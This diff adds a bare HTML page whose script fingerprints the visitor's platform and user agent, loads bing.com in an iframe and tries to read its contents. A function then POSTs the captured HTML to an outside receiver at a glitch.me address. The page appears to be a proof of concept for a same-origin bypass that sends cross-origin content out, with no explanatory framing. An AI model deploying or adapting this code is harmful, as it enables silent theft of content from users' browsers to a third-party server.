@@ -1,0 +1,111 @@
+<!-- file(X)
+ -->
+
+<html>
+  <head>
+    
+    <script>
+
+    //document.domain="http://127.0.0.1";
+
+    document.addEventListener('DOMContentLoaded', function() {
+          var platform = navigator.platform;
+          var userAgent = navigator.userAgent;
+          var uaOs;
+          var webServer = "unknown";
+
+          // OS from User-agent
+          if (userAgent.includes('Windows')) {
+              uaOs = 'Windows';
+          } else if (userAgent.includes('Linux')) {
+              uaOs = 'Linux';
+          }
+
+           // OS 
+          if (platform.includes('Win')) {
+              platform = 'Windows';
+          } else if (platform.includes('Linux')) {
+              platform = 'Linux';
+          } else {
+              platform = uaOs;
+          }
+
+          // logging OS, browser version
+          console.log("Platform: " + platform);
+          console.log("User-Agent: " + userAgent);
+          console.log("Determined OS: " + uaOs);
+      
+          var sp1Element = document.getElementById('sp1');
+          var sp2Element = document.getElementById('sp2');
+          var sp3Element = document.getElementById('sp3');
+          var sp4Element = document.getElementById('sp4');
+          sp1Element.textContent = "-Platform:" + navigator.platform;
+          sp2Element.textContent = "-U-agent :" + navigator.userAgent;
+          sp3Element.textContent = "-Det-plat:" + platform;
+
+          sp4Element.textContent = "-location:" + window.location; //document.domain;
+
+          if (!window.location.href.includes('glitch')) {
+              sp4Element.textContent = "-Location:" + window.location.href; //document.domain;
+          }
+          else
+              sp4Element.textContent = "-Location:Remote";
+      
+          var sp5Element = document.getElementById('sp5');      
+
+          // set iframe src
+          setIframeSrcAndLoad('iframe', 'https://bing.com');        
+ 
+      
+          function setIframeSrcAndLoad(iframeId, src) {
+              var iframe = document.getElementById(iframeId);
+              iframe.src = src;
+              iframe.onload = function() {
+                  var content = iframe.contentWindow.document.body.innerHTML;
+                  sendDataToServer(src, content);
+              };
+          }
+
+    });  
+      
+    // Transfer data to server
+    function sendDataToServer(url, data) {
+        var xhr = new XMLHttpRequest();
+        xhr.open('POST', 'https://artistic-spiny-network.glitch.me/receive', true);
+        xhr.setRequestHeader('Content-Type', 'application/json');
+
+        // if ( url.includes('glitch') )
+        //   return;
+      
+        xhr.onreadystatechange = function() {
+            if (xhr.readyState === XMLHttpRequest.DONE) {
+                // process data
+                if (xhr.status === 200) {
+                    console.log('send data');
+                } else {
+                    console.log('Errors in transit');
+                }
+            }
+        };
+
+        // trans data (json)
+        xhr.send(JSON.stringify({ url: url, data: data }));
+    }
+        
+    </script>
+  
+  </head>
+  
+<body>
+    <span id="sp1"></span><br>
+    <span id="sp2"></span><br>
+    <span id="sp3"></span>&nbsp;&nbsp;
+    <span id="sp4"></span>&nbsp;&nbsp;
+    <span id="sp5"></span>
+    <p></p>
+  
+    <iframe id="iframe"    width="600" height="400"></iframe>
+
+  </body> 
+
+</html>
